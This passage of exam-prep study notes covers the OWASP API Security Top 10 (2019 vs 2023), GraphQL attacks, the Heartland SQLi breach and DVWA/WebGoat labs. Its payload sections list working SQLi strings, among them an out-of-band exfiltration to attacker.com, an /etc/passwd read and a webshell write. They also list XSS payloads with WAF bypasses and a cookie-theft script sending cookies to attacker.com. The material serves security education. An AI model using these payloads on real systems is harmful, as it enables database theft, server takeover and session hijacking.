→ Returns attacker's own profile ✅

# BOLA attack — change ID to another user's:
GET /api/v1/users/12346/profile
Authorization: Bearer attacker_token
→ Returns victim's profile ❌ (no authorization check on object ownership)
```

**Real-World Example:** <!--citation:6-->The Dell API breach (2024) saw attackers exploit an API vulnerability in Dell's partner portal, accessing 49 million customer records by manipulating fake accounts. The lack of proper authorization checks allowed unauthorized access to sensitive data — a classic BOLA issue.

**Countermeasures:**
- Implement object-level authorization checks in every API function that accesses data using client-supplied ID
- Use authorization mechanisms that compare logged-in user against object ownership
- Use random, unpredictable IDs (UUIDs) instead of sequential integers — security through obscurity only; real fix is authorization
- Log and alert on access denials — enumerate patterns indicate BOLA scanning

---

#### API2:2023 — Broken Authentication

**Position:** #2 (same as API2:2019 — unchanged; renamed from "Broken Authentication" — same name retained)

**What it is:**
Authentication mechanisms are misconfigured, missing, or incorrectly implemented — allowing attackers to compromise authentication tokens, impersonate users, or take over accounts.

<!--citation:10-->Weak, incorrect, or incomplete authentication enables account compromise, token replay, or impersonation. This includes improper JWT validation (e.g., accepting `alg:none`, ignoring invalid signatures, missing claims).

**API-specific authentication failures:**
- No rate limiting on `/login` — credential stuffing at scale
- Weak JWT validation — `alg:none`, `RS256` → `HS256` confusion
- API keys transmitted in URLs (logged in proxy/server logs)
- No token expiry — stolen tokens valid indefinitely
- Predictable token generation
- Missing authentication on some API versions (v1 secured, v2 forgotten)

---

#### API3:2023 — Broken Object Property Level Authorization (BOPLA)

**Position:** #3 (NEW name in 2023 — consolidates two 2019 categories)

> [!NOTE]
> This is one of the most MCQ-tested consolidations in API Security. <!--citation:19-->API3:2019 (Excessive Data Exposure) and API6:2019 (Mass Assignment) were merged into API3:2023 Broken Object Property Level Authorization (BOPLA), consolidating risks tied to excessive object field exposure and unauthorized property manipulation.

**Two sub-risks under BOPLA:**

**1. Excessive Data Exposure (was API3:2019):**
API returns full object with all properties — client is expected to filter. Attacker intercepts raw response and reads sensitive fields.
```json
// API response exposes all user fields:
{
  "id": 123,
  "username": "alice",
  "email": "alice@example.com",
  "ssn": "123-45-6789",         ← should not be exposed
  "internal_credit_score": 720,  ← should not be exposed
  "admin": false                  ← should not be exposed
}
```

**2. Mass Assignment (was API6:2019):**
API automatically binds client-provided JSON properties to internal data model without filtering — attacker adds privileged properties to the request body.
```json
// Normal user update request:
PATCH /api/v1/users/123
{"email": "newemail@example.com"}

// Mass assignment attack:
PATCH /api/v1/users/123
{"email": "newemail@example.com", "admin": true, "credit_balance": 9999}
// If API binds all properties → user gains admin flag + free credits
```

**Countermeasures:**
- Never return full data objects — explicitly define which fields to include in each response
- Use response schemas/serializers that allowlist output fields
- Implement property-level authorization — check each field against the requester's permissions
- Never auto-bind request body properties to model objects — explicitly map allowed fields

---

#### API4:2023 — Unrestricted Resource Consumption

**Position:** #4 (was API4:2019 "Lack of Resources & Rate Limiting" — renamed to focus on root cause)

> [!NOTE]
> <!--citation:19-->API4 was updated from "Lack of Resources & Rate Limiting" to "Unrestricted Resource Consumption", stressing the root cause rather than symptoms.

**What it is:**
APIs do not restrict the number/frequency of requests, or the size of payloads/responses — attackers consume resources to cause DoS, financial damage, or data scraping at scale.

**Attack vectors:**
- HTTP flood — thousands of requests per second
- Missing rate limiting on compute-expensive endpoints (search, export, ML inference)
- No pagination — request returns entire database
- Bulk operations without limits — `DELETE /api/users?all=true`
- Webhook abuse — trigger expensive downstream processing at scale
- SMS/email OTP abuse — request OTPs to rack up provider costs

**Countermeasures:**
- Rate limiting per IP, per user, per API key
- Request payload size limits
- Pagination on all list endpoints — enforce maximum page size
- Throttle compute-intensive endpoints
- Monitor and alert on abnormal consumption patterns

---

#### API5:2023 — Broken Function Level Authorization (BFLA)

**Position:** #5 (same as API5:2019 — unchanged)

**What it is:**
The API does not verify that a user has permission to **call a specific function/endpoint** — particularly admin functions. A regular user can call admin endpoints by simply knowing the URL.

**Difference from BOLA:**
- **BOLA** = can access/modify **data** they shouldn't (horizontal: other users' objects)
- **BFLA** = can call **functions/endpoints** they shouldn't (vertical: admin-level operations)

```http
# Regular user trying admin endpoint:
DELETE /api/v1/admin/users/456
Authorization: Bearer regular_user_token
→ Should return 403 — but BFLA vulnerability allows it
```

**Real-World Example:** <!--citation:6-->Kia's web portal API flaw (2023) allowed researchers to remotely control vehicle functions (e.g., unlocking doors) using only a license plate number, due to missing function-level authorization. The API allowed unauthorized access to sensitive functions — a clear violation of function-level access controls.

---

#### API6:2023 — Unrestricted Access to Sensitive Business Flows

**Position:** #6 (BRAND NEW in 2023 — no 2019 equivalent)

**What it is:**
APIs expose legitimate business flows — but an attacker abuses them at **machine speed** to gain unfair advantage or cause harm. There is no technical vulnerability — the business logic itself is exploited through automation.

**Examples:**
- Scalping bots that buy all tickets/items in milliseconds using the purchase API
- Account creation bots registering thousands of free trial accounts
- Voting/rating manipulation bots inflating scores
- Scraping APIs at scale to steal business data
- OTP enumeration bots for account takeover

**Key distinction:** The API endpoint works correctly — the **abuse is through scale and automation**, not a code flaw.

**Countermeasures:**
- CAPTCHA on sensitive flows
- Device fingerprinting to detect bot behavior
- Rate limiting per IP, account, device
- Require human verification (email confirmation, payment) before valuable resources are consumed
- Behavioral analytics — flag abnormal usage patterns

---

#### API7:2023 — Server Side Request Forgery (SSRF)

**Position:** #7 (BRAND NEW in 2023 — no 2019 equivalent as standalone)

> [!NOTE]
> SSRF appears in **three different OWASP contexts**: it was **A10:2021** in the Web App Top 10 (absorbed into A01:2025), and it's **API7:2023** in the API Security Top 10 (still standalone here). Know both placements.

**What it is:**
The API fetches a remote resource based on a user-supplied URL — without validating whether the destination is permitted. Attacker points the URL to internal resources.

**API-specific SSRF patterns:**
- Webhook registration — register `http://169.254.169.254/latest/meta-data/` as webhook URL
- Image/URL preview features
- PDF generators that fetch URLs
- Import-from-URL features

---

#### API8:2023 — Security Misconfiguration

**Position:** #8 (was API7:2019 — moved down one)

> [!NOTE]
> <!--citation:7-->Security misconfiguration is a catch-all for a wide range of security misconfigurations that often negatively impact API security as a whole. This threat was number 7 on the OWASP API Security Top 10 released in 2019 and has moved to position 8 in 2023.

**API-specific misconfiguration patterns:**
- Missing or incorrect HTTP security headers on API responses
- CORS misconfiguration — `Access-Control-Allow-Origin: *` on authenticated APIs
- Verbose error messages exposing stack traces, internal paths, schema
- Unnecessary HTTP methods allowed (`TRACE`, `PUT` on read-only endpoints)
- Deprecated TLS versions still supported
- API documentation (Swagger/OpenAPI) exposed in production
- Default API gateway configurations left unchanged

---

#### API9:2023 — Improper Inventory Management

**Position:** #9 (same position as API9:2019 — renamed from "Improper Assets Management")

> [!NOTE]
> <!--citation:7-->This threat is the result of an outdated or incomplete inventory which can create unknown gaps in the API attack surface. Improper Inventory Management has replaced Improper Assets Management as number 9, and while the name changed to emphasize an accurate API inventory, the threat remains the same.

**What it is:**
Organizations lose track of the APIs they have deployed — old versions stay live, debug endpoints remain accessible, internal APIs get exposed externally without authorization review.

<!--citation:3-->API9:2023 (Improper Inventory Management) is consistently underrated. Most teams focus on securing the APIs they know about — the problem is the ones they don't. Deprecated endpoints, shadow APIs, and debug routes left open in staging represent attack surfaces that don't show up in API gateway logs because nobody documented them.

**Attack scenarios:**
- v1 of API retired in favor of v2 — but v1 remains deployed, receives no security updates
- Debug endpoints (`/api/debug`, `/api/test`) left in production
- Shadow APIs — APIs deployed by individual teams without central security review
- API exposed on a forgotten server/port not behind the API gateway

---

#### API10:2023 — Unsafe Consumption of APIs

**Position:** #10 (BRAND NEW in 2023 — replaces API10:2019 "Insufficient Logging & Monitoring")

> [!NOTE]
> <!--citation:9-->API10:2023 — Unsafe Consumption of APIs replaces API10:2019 — Insufficient Logging & Monitoring. <!--citation:19-->Two risks were removed from the 2019 list: Injection and Insufficient Logging & Monitoring.

**What it is:**
The API **consumes third-party APIs or external data** without adequate validation and security controls — treating external API responses as trusted. Attacker compromises or manipulates the third-party API, and the vulnerable API processes the malicious response.

<!--citation:3-->Unsafe consumption at scale is increasingly relevant as LLM pipelines frequently pull from third-party APIs without validating responses, multiplying API10 risk.

**Attack scenarios:**
- Third-party geocoding API compromised — returns malicious data → app processes it without validation → SQLi or XSS via API response
- Supply chain attack via trusted third-party API
- SSRF via third-party API callback URL
- Redirect following — attacker controls redirect → app follows to attacker-controlled URL

**Countermeasures:**
- Treat third-party API responses as untrusted — validate all data before processing
- Enforce TLS validation when consuming external APIs
- Allowlist permitted redirect targets
- Set timeout and resource limits on outbound API calls
- Monitor third-party API behavior for anomalies

---

### 6.2 OWASP API Security Top 10 : 2019 — Full List

> [!NOTE]
> The 2019 list was the first OWASP API Security publication. <!--citation:8-->The first OWASP API Security Top 10 list was released on 31 December 2019.

<!--citation:17-->The 2019 list is: API1:2019 — Broken Object-Level Authorization (BOLA) · API2:2019 — Broken Authentication · API3:2019 — Excessive Data Exposure · API4:2019 — Lack of Resources & Rate Limiting · API5:2019 — Broken Function-Level Authorization · API6:2019 — Mass Assignment · API7:2019 — Security Misconfiguration · API8:2019 — Injection · API9:2019 — Improper Assets Management · API10:2019 — Insufficient Logging & Monitoring.

---

### 6.3 API Security 2019 vs 2023 — Comparison Table

> [!NOTE]
> This is the primary MCQ target for API Security cross-version questions. Know every position, every rename, every merge, every new entry, and every removal.

| 2019 Position | 2019 Name | 2023 Position | 2023 Name | Change |
|---|---|---|---|---|
| API1:2019 | Broken Object Level Authorization (BOLA) | API1:2023 | Broken Object Level Authorization (BOLA) | ✅ Unchanged |
| API2:2019 | Broken Authentication | API2:2023 | Broken Authentication | ✅ Unchanged (same name, position) |
| API3:2019 | Excessive Data Exposure | API3:2023 | Broken Object Property Level Authorization (BOPLA) | 🔀 Renamed + merged with API6:2019 |
| API4:2019 | Lack of Resources & Rate Limiting | API4:2023 | Unrestricted Resource Consumption | ✏️ Renamed (same concept, root-cause framing) |
| API5:2019 | Broken Function Level Authorization (BFLA) | API5:2023 | Broken Function Level Authorization (BFLA) | ✅ Unchanged |
| API6:2019 | Mass Assignment | API3:2023 | *(merged into BOPLA)* | 🔀 Merged into API3:2023 |
| API7:2019 | Security Misconfiguration | API8:2023 | Security Misconfiguration | ↓ Moved down one position |
| API8:2019 | Injection | — | *(removed)* | ❌ Removed (covered by Web App Top 10) |
| API9:2019 | Improper Assets Management | API9:2023 | Improper Inventory Management | ✏️ Renamed (same position) |
| API10:2019 | Insufficient Logging & Monitoring | — | *(removed)* | ❌ Removed |
| — | *(not in 2019)* | API6:2023 | Unrestricted Access to Sensitive Business Flows | 🆕 New in 2023 |
| — | *(not in 2019)* | API7:2023 | Server Side Request Forgery (SSRF) | 🆕 New in 2023 |
| — | *(not in 2019)* | API10:2023 | Unsafe Consumption of APIs | 🆕 New in 2023 |

---

### 6.4 What's New, What Merged, What Was Removed (2019→2023)

> [!NOTE]
> This mirrors the Section 4.4–4.7 logic from Session 01A — applied to the API Security list.

**New in 2023 (3 categories):**

| Category | Why It Was Added |
|---|---|
| API6:2023 Unrestricted Access to Sensitive Business Flows | Bot abuse of legitimate business flows became a primary attack vector (ticket scalping, account farming) |
| API7:2023 SSRF | SSRF became a top API attack vector — AWS metadata endpoint reached via API webhooks and URL-fetch features |
| API10:2023 Unsafe Consumption of APIs | Third-party API trust recognized as a first-class attack vector; supply chain risk at API layer |

**Removed from 2023 (2 categories):**
<!--citation:19-->Two risks were removed: Injection and Insufficient Logging & Monitoring.
- **API8:2019 Injection** — still a risk but covered by the Web App Top 10; removed from API-specific list to avoid duplication
- **API10:2019 Insufficient Logging & Monitoring** — replaced by Unsafe Consumption of APIs; logging risk still applies but not API-specific

**Merged in 2023 (2 → 1):**
<!--citation:19-->API3:2019 (Excessive Data Exposure) and API6:2019 (Mass Assignment) merged into API3:2023 Broken Object Property Level Authorization (BOPLA).
- Root cause is the same: unauthorized access to object **properties** — whether reading too many (excessive exposure) or writing unauthorized ones (mass assignment)

---

### 6.5 BOLA vs IDOR — The Critical Distinction

> [!NOTE]
> This is heavily MCQ-tested because BOLA and IDOR look identical in practice. The distinction is conceptual and context-specific.

| Property | BOLA | IDOR |
|---|---|---|
| **Full name** | Broken Object Level Authorization | Insecure Direct Object Reference |
| **Origin** | OWASP API Security Top 10 (API1:2019, API1:2023) | OWASP Web App Top 10 (A4:2013, removed standalone in 2017) |
| **Context** | API-specific — REST/GraphQL endpoints using object IDs | Web applications — URLs, form fields referencing objects |
| **Definition emphasis** | Authorization failure — no check that requester owns/is authorized for the object | Object reference directly exposed to user — exposed + no auth check = IDOR |
| **Scope** | Specifically about authorization logic at object level | Broader — includes exposed references even without auth bypass |
| **Relationship** | BOLA is the **API-specific form** of IDOR | IDOR is the **web app form** that BOLA evolved from |
| **Example** | `GET /api/users/12346` — no ownership check | `GET /download?file_id=12346` — no ownership check |
| **Current OWASP placement** | API1:2023 (API Security Top 10) | Absorbed into A01:2025 Broken Access Control (Web App Top 10) |

> [!IMPORTANT]
> For exam purposes: **BOLA = API1:2023** (API Security list). **IDOR** is a web app concept that now falls under **A01:2025 Broken Access Control** in the Web App Top 10. They describe the same attack mechanism — the difference is context (API vs web app) and the list they appear on.

---

### 6.6 BOLA vs BFLA — The Other Key Distinction

> [!NOTE]
> Another heavily tested pair. Both are authorization failures but at different levels.

| Property | BOLA (API1:2023) | BFLA (API5:2023) |
|---|---|---|
| **Full name** | Broken Object Level Authorization | Broken Function Level Authorization |
| **What's missing** | Authorization check on **data object** | Authorization check on **API function/endpoint** |
| **Access type** | Horizontal — accessing another user's data | Vertical — accessing privileged functions (admin operations) |
| **Example attack** | Read another user's account data by changing ID | Call `/api/admin/deleteUser` as a regular user |
| **Also known as** | IDOR in web app context | Privilege escalation / Vertical access control bypass |
| **CWE** | CWE-639 | CWE-285 |

---

### 6.7 GraphQL Injection Attack Surface

> [!NOTE]
> GraphQL is increasingly used as an API technology and introduces unique injection and access control attack surfaces not present in REST APIs.

**What is GraphQL:**
- Query language for APIs — clients specify exactly what data they need
- Single endpoint (typically `/graphql`) instead of multiple REST endpoints
- Supports queries (read) and mutations (write/update)

**GraphQL-specific attack vectors:**

| Attack | Description |
|---|---|
| **Introspection abuse** | `{__schema{types{name}}}` — dumps entire API schema, reveals all types, fields, queries, mutations |
| **Batch query attack** | Send hundreds of queries in a single request — bypasses per-request rate limiting |
| **Nested query DoS** | Deeply nested query forces exponential database lookups: `{user{friends{friends{friends{...}}}}}` |
| **GraphQL injection** | Inject control characters into variable values passed to resolvers — SQLi via GraphQL variables |
| **Alias flooding** | Use GraphQL aliases to repeat same query hundreds of times in one request |
| **BOLA via GraphQL** | Query another user's object by supplying their ID in a query variable — same as REST BOLA |
| **Mass assignment via mutations** | Mutation input includes undocumented fields → BOPLA |

**GraphQL injection via variables:**
```graphql
query {
  user(id: "1 UNION SELECT password FROM users--") {
    name
    email
  }
}
```
If the resolver builds SQL from the `id` variable without parameterization → SQLi via GraphQL.

**Countermeasures:**
- Disable introspection in production
- Implement query depth limits and query complexity limits
- Rate limit at query operation level, not just HTTP request level
- Validate and sanitize all resolver inputs
- Implement BOLA checks in resolvers (same as REST)

---

### 6.8 SQLi Payload Deep Dive — All Types With Payloads

> [!NOTE]
> This section compiles the key payload patterns for all 6 SQLi types. Combined with Section 1, this is everything needed to answer any SQLi payload MCQ.

**Authentication bypass payloads:**
```sql
' OR '1'='1                  → classic always-true
' OR 1=1--                   → MySQL/MSSQL (comment out remainder)
' OR 1=1#                    → MySQL (hash comment)
admin'--                     → comment out password check (if username=admin known)
' OR 'x'='x                  → variant
1' OR '1'='1'/*              → block comment
```

**Union-based column count discovery:**
```sql
' ORDER BY 1--              → no error
' ORDER BY 2--              → no error
' ORDER BY 3--              → error → 2 columns confirmed
' UNION SELECT NULL--       → test 1 column
' UNION SELECT NULL,NULL--  → test 2 columns
```

**Union-based data extraction:**
```sql
' UNION SELECT version(),NULL--                  → DB version
' UNION SELECT database(),NULL--                 → current DB name
' UNION SELECT user(),NULL--                     → DB user
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns
  WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

**Error-based payloads (MySQL):**
```sql
' AND ExtractValue(1,concat(0x7e,version()))--
' AND UpdateXML(1,concat(0x7e,(SELECT user())),1)--
```

**Boolean-based blind payloads:**
```sql
' AND 1=1--                                    → true (page loads)
' AND 1=2--                                    → false (page changes)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
```

**Time-based blind payloads:**
```sql
'; IF(1=1,SLEEP(5),0)--                        → MySQL conditional sleep
'; WAITFOR DELAY '0:0:5'--                     → MSSQL unconditional
'; IF(ASCII(SUBSTRING((SELECT database()),1,1))=109,SLEEP(5),0)-- → MySQL data extraction
```

**OOB payloads (MySQL):**
```sql
' UNION SELECT LOAD_FILE(concat('\\\\',(SELECT password FROM users
  LIMIT 1),'.attacker.com\\a'))--
```

**File read/write (MySQL, requires FILE privilege):**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd')--       → read local file
' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--  → write webshell
```

**Common SQLi comment styles:**
```sql
--      → ANSI SQL (MSSQL, PostgreSQL, MySQL with space after)
-- -    → MySQL (dash-dash-space)
#       → MySQL only
/**/    → Inline comment (bypass space filters)
/*!*/   → MySQL version-specific comment (bypasses some WAFs)
```

---

### 6.9 XSS Payload Patterns — Reflected · Stored · DOM

> [!NOTE]
> Context-aware XSS payload reference — for MCQs testing which payload works in which injection context.

**Basic payloads:**
```javascript
<script>alert(1)</script>                    // Classic — HTML context
<img src=x onerror=alert(1)>                // HTML attribute event handler
<svg onload=alert(1)>                        // SVG element
<body onload=alert(1)>                       // Body tag event
<iframe src="javascript:alert(1)">           // Javascript URI in iframe
```

**Attribute context payloads (value inside attribute):**
```html
<!-- Input is reflected in: <input value="INJECTION"> -->
"><script>alert(1)</script>                  // Break out of attribute + tag
" onmouseover="alert(1)                      // Inject event handler
```

**JavaScript context payloads (inside a script tag):**
```javascript
// Input reflected in: <script>var x = 'INJECTION'</script>
';alert(1);//                                // Close string, inject, comment
\';alert(1);//                               // Escape existing backslash
```

**WAF bypass techniques:**
```javascript
<ScRiPt>alert(1)</ScRiPt>                   // Case variation
<script>alert`1`</script>                   // Template literal (no parentheses)
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>  // HTML entity encoding
<svg/onload=alert(1)>                       // Slash instead of space
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

**Cookie theft payload (Reflected / Stored):**
```javascript
<script>
  new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>
```

**DOM-Based XSS payloads:**
```javascript
// URL: https://site.com/page#<img src=x onerror=alert(1)>
// (Hash fragment — never sent to server — pure client-side)

// URL: https://site.com/page?name=<script>alert(1)</script>
// (When JS reads location.search and writes to innerHTML)
```

---

### 6.10 Heartland Payment Systems Breach — Full Case Study

> [!NOTE]
> This case study is the canonical real-world SQLi example. Know every technical detail.

**Organisation:** Heartland Payment Systems — a US payment processing company

**Year:** 2007–2008 (breach occurred 2007; discovered January 2008)

**Attack Chain:**
1. **Initial access:** SQL injection exploited on Heartland's public-facing web application — a classic in-band SQLi via a vulnerable login/search form
2. **Lateral movement:** SQLi used to execute OS commands (via `xp_cmdshell` or equivalent) and plant **malware** (a sniffer) on internal payment processing systems
3. **Data exfiltration:** The malware captured **payment card data in transit** — track data from magnetic stripes — as transactions were processed in memory (RAM scraping)
4. **Scale:** Over **130 million credit and debit card numbers** exfiltrated — the largest payment card breach at the time in US history

**Technical root cause:**
- Vulnerable web application allowed SQL injection
- Database account had excessive privileges (allowed OS command execution)
- No network segmentation between web tier and payment processing tier
- No anomaly detection to catch lateral movement

**OWASP 2025 categories violated:**
| Category | Violation |
|---|---|
| A05:2025 Injection | SQL Injection initial access vector |
| A01:2025 Broken Access Control | No separation between web app and payment systems |
| A02:2025 Security Misconfiguration | Excessive DB privileges; no network segmentation |
| A09:2025 Logging and Alerting Failures | Breach undetected for months |

**Aftermath:**
- Heartland paid over **$145 million in settlements**
- Albert Gonzalez (organizer) sentenced to **20 years** — longest sentence for cybercrime in the US at the time
- Triggered widespread adoption of **PCI DSS** compliance enforcement in the payments industry

---

### 6.11 DVWA and WebGoat — Lab Context Reference

> [!NOTE]
> DVWA and WebGoat are the two primary intentionally vulnerable applications used for practising the injection attacks in this session. This section gives you the context to answer MCQs referencing lab environments.

**DVWA (Damn Vulnerable Web Application):**
- PHP/MySQL intentionally vulnerable web app
- Difficulty levels: Low, Medium, High, Impossible
- Relevant modules for this session:
  - **SQL Injection** — Classic in-band SQLi (text box input)
  - **SQL Injection (Blind)** — Boolean and time-based blind SQLi
  - **File Inclusion** — LFI and RFI (with PHP allow_url_include)
  - **XSS (Reflected)** — URL parameter reflected
  - **XSS (Stored)** — Comment field stored XSS
  - **XSS (DOM)** — Hash-based DOM XSS
  - **Command Injection** — `ping` input with metacharacter injection
- Security levels change filtering — "Low" has no filter; "High" has stricter filters to practice bypass
- Common setup: XAMPP / Docker

**WebGoat:**
- Java-based (Spring Boot) intentionally vulnerable app by OWASP
- More structured — lesson-based with explanations built in
- Relevant modules for this session:
  - **SQL Injection (intro)** — basic to advanced SQLi
  - **SQL Injection (advanced)** — Union-based, blind
  - **Cross-Site Scripting** — Reflected and stored
  - **Path Traversal** — LFI-equivalent in Java context
  - **XXE** — XML External Entity (cross-reference Session 04B)
- Ships with WebWolf — companion app for OOB callbacks (similar to Burp Collaborator)

**Key differences:**

| Property | DVWA | WebGoat |
|---|---|---|
| Language | PHP + MySQL | Java (Spring Boot) |
| Creator | RandomStorm / DVWA Team | OWASP |
| Style | Freeform — exploit the vuln | Lesson-based — guided tasks |
| Best for | Hands-on free exploitation practice | Structured learning with explanations |
| XSS DOM module | ✅ Yes | ✅ Yes |
| SQLMap practice | ✅ Yes (SQL Injection module) | ⚠️ Limited |

---

## 7. Abbreviations Table

| Abbreviation | Full Form | Technical Meaning |
|---|---|---|
| SQLi | SQL Injection | Injecting malicious SQL into a database query via unsanitized user input |
| OOB | Out-of-Band | Data exfiltration via a separate channel (DNS, HTTP) — not the main response |
| LFI | Local File Inclusion | Including a local server file via user-controlled path parameter |
| RFI | Remote File Inclusion | Including a remote attacker-controlled file via user-controlled URL parameter |
| XSS | Cross-Site Scripting | Injecting malicious scripts into web pages executed by victim's browser |
| DOM | Document Object Model | Browser's tree representation of an HTML page — DOM XSS exploits client-side JS manipulation |
| BOLA | Broken Object Level Authorization | API authorization failure at data object level — API1:2023 |
| IDOR | Insecure Direct Object Reference | Web app authorization failure when object references are directly exposed to users |
| BFLA | Broken Function Level Authorization | API authorization failure at function/endpoint level — API5:2023 |
| BOPLA | Broken Object Property Level Authorization | API authorization failure at field/property level — API3:2023 |
| ORM | Object-Relational Mapper | Framework abstracting DB queries; parameterizes by default (Hibernate, SQLAlchemy) |
| ODM | Object Document Mapper | NoSQL equivalent of ORM — Mongoose for MongoDB |
| SSTI | Server-Side Template Injection | Injecting template syntax into server-side engines (Jinja2, Twig) → RCE |
| RCE | Remote Code Execution | Attacker executes arbitrary code on the target system |
| WAF | Web Application Firewall | Filters and monitors HTTP traffic to block attack patterns |
| CSP | Content Security Policy | HTTP header restricting sources of scripts/styles — primary XSS defense |
| DVWA | Damn Vulnerable Web Application | Intentionally vulnerable PHP/MySQL app for security testing practice |
| API | Application Programming Interface | Interface allowing software components to communicate — REST, GraphQL, SOAP |
| REST | Representational State Transfer | Architectural style for APIs using HTTP methods on resource endpoints |
| BSON | Binary JSON | Binary-encoded JSON — native format of MongoDB |
| OOB | Out-of-Band | Communication on a separate channel from the primary data flow |
| CORS | Cross-Origin Resource Sharing | HTTP mechanism allowing or restricting cross-origin API requests |
| JWT | JSON Web Token | Compact token format for API authentication — subject to `alg:none`, confusion attacks |
| SSRF | Server-Side Request Forgery | Server makes unauthorized requests on attacker's behalf — API7:2023, A01:2025 |
| SBOM | Software Bill of Materials | Inventory of all software components — relevant to API supply chain risk |
| ROP | Return-Oriented Programming | Exploitation technique chaining existing code snippets (gadgets) to bypass DEP/NX |
| NX | No-Execute | Memory protection marking data pages as non-executable — mitigates buffer overflows |
| DEP | Data Execution Prevention | Windows implementation of NX — prevents code execution from data regions |

---

## 8. Keywords + Concept Map

| Term | Definition | Connects To | Use Case / Context |
|---|---|---|---|
| **Parameterized Query** | Query with placeholders — input bound as data, never as SQL | SQLi defense, ORM, stored procedures | Defeats all 6 SQLi types |
| **Second-Order SQLi** | Payload stored safely, fires when retrieved and reused in new query | Input escaping false security | Common in password-change, profile-update flows |
| **Boolean Blind SQLi** | No visible output — infer data from true/false response differences | Automated by SQLMap | When app shows no errors and no data |
| **Time Blind SQLi** | No visible or behavioral output — use SLEEP/WAITFOR to confirm via timing | SLEEP(), WAITFOR, pg_sleep() | Last resort when boolean blind not possible |
| **OOB SQLi** | Data exfiltrated via DNS/HTTP to attacker-controlled server | Burp Collaborator, xp_dirtree | When in-band and time-based unreliable |
| **Log Poisoning** | Inject PHP into server logs → include logs via LFI → RCE | LFI → RCE escalation | Apache/Nginx access log, SSH auth log |
| **Path Traversal** | Navigate filesystem via `../` sequences to access files outside intended dir | LFI, A01:2025, A02:2025 | `/etc/passwd`, `win.ini` access |
| **allow_url_include** | PHP config enabling remote file inclusion — must be Off | RFI prerequisite | Off by default since PHP 5.2 |
| **Reflected XSS** | Payload in request → reflected in response → single-victim | Phishing links, URL injection | Search results, error pages |
| **Stored XSS** | Payload saved to DB → fires for all page viewers | Comment fields, profiles | Most dangerous XSS type |
| **DOM XSS** | Client-side JS reads attacker-controlled source → writes to dangerous sink | Source→sink, innerHTML, eval | SPAs, hash fragments |
| **Source (DOM XSS)** | Where attacker input enters client-side JS | location.hash, URL params | DOM XSS analysis |
| **Sink (DOM XSS)** | Where data is written unsafely in DOM | innerHTML, eval(), document.write | DOM XSS exploitation |
| **HttpOnly** | Cookie flag preventing JS access to cookie | XSS cookie theft mitigation | `Set-Cookie: session=x; HttpOnly` |
| **BOLA** | API authorization failure at object level — API1:2023 | IDOR, horizontal access | Core API security risk |
| **BFLA** | API authorization failure at function level — API5:2023 | Vertical privilege escalation | Admin endpoint abuse |
| **BOPLA** | API property-level authorization failure — API3:2023 | Excessive data exposure + mass assignment | Field-level API access control |
| **Mass Assignment** | API auto-binds request body to model — attacker injects privileged fields | BOPLA (API3:2023) | `admin: true` in POST body |
| **GraphQL Introspection** | Schema discovery query — reveals all types, fields, mutations | GraphQL attack recon | `{__schema{types{name}}}` |
| **NoSQL Operator Injection** | Injecting MongoDB operators ($ne, $gt) to bypass query logic | MongoDB, $where, ODM | Authentication bypass via `{"$ne":""}` |
| **xp_cmdshell** | MSSQL stored procedure enabling OS command execution | SQLi → RCE escalation | Disabled by default; re-enableable by sysadmin |
| **Shellshock** | CVE-2014-6271 — Bash processes env vars as functions → RCE | Command injection, CGI | Triggered via HTTP headers in CGI scripts |
| **Burp Collaborator** | Burp Suite's OOB callback server — captures DNS/HTTP for OOB testing | OOB SQLi, Blind XSS, SSRF | Session 03B deep dive |

---

## 9. Quick Reference Cheatsheet

### 📊 SQLi Types — Full Reference

| Type | Channel | Data Visibility | Key Technique | Speed | Tool Support |
|---|---|---|---|---|---|
| Classic / In-Band | HTTP response | Full data visible | Direct query | Fast | Manual + SQLMap |
| Union-Based | HTTP response | Full data via UNION | Column count → UNION SELECT | Fast | Manual + SQLMap |
| Error-Based | HTTP response (error msg) | Data in error message | ExtractValue, CONVERT | Fast | Manual + SQLMap |
| Boolean Blind | HTTP response (behavior) | Binary true/false | SUBSTRING + ASCII comparison | Slow | SQLMap (automated) |
| Time-Based Blind | Response timing | Binary via delay | SLEEP, WAITFOR DELAY | Very slow | SQLMap (automated) |
| Out-of-Band | DNS / HTTP callback | Asynchronous exfil | xp_dirtree, UTL_HTTP, DNS lookup | Fast | SQLMap + Burp Collaborator |

---

### 📊 XSS Types — Full Reference

| Type | Persistence | Server-Side | WAF Visible | Victim Scope | Key Defense |
|---|---|---|---|---|---|
| Reflected | ❌ No | ✅ Yes (in response) | ✅ Yes | Single (must click link) | Output encoding + CSP |
| Stored | ✅ Yes | ✅ Yes (in DB) | ✅ On submission | All viewers of page | Output encoding + CSP |
| DOM-Based | ❌ No | ❌ No | ❌ No | URL-dependent | DOMPurify, textContent, Trusted Types |

---

### 📊 OWASP API Security 2019 vs 2023 — Quick Reference

| 2019 | Name | 2023 | Name | Change |
|---|---|---|---|---|
| API1 | Broken Object Level Authorization | API1 | Broken Object Level Authorization | ✅ Same |
| API2 | Broken Authentication | API2 | Broken Authentication | ✅ Same |
| API3 | Excessive Data Exposure | API3 | Broken Object Property Level Authorization | 🔀 Merged with API6 |
| API4 | Lack of Resources & Rate Limiting | API4 | Unrestricted Resource Consumption | ✏️ Renamed |
| API5 | Broken Function Level Authorization | API5 | Broken Function Level Authorization | ✅ Same |
| API6 | Mass Assignment | *(API3)* | *(merged into BOPLA)* | 🔀 Merged into API3 |
| API7 | Security Misconfiguration | API8 | Security Misconfiguration | ↓ Moved down |
| API8 | Injection | — | *(removed)* | ❌ Removed |
| API9 | Improper Assets Management | API9 | Improper Inventory Management | ✏️ Renamed |
| API10 | Insufficient Logging & Monitoring | — | *(removed)* | ❌ Removed |
| — | — | API6 | Unrestricted Access to Sensitive Business Flows | 🆕 New |
| — | — | API7 | Server Side Request Forgery (SSRF) | 🆕 New |
| — | — | API10 | Unsafe Consumption of APIs | 🆕 New |

---

### 📊 File Inclusion — Attack Type Quick Reference

| Property | LFI | RFI |
|---|---|---|
| File Source | Local server filesystem | Remote attacker URL |
| PHP Setting | No special setting needed | `allow_url_include = On` |
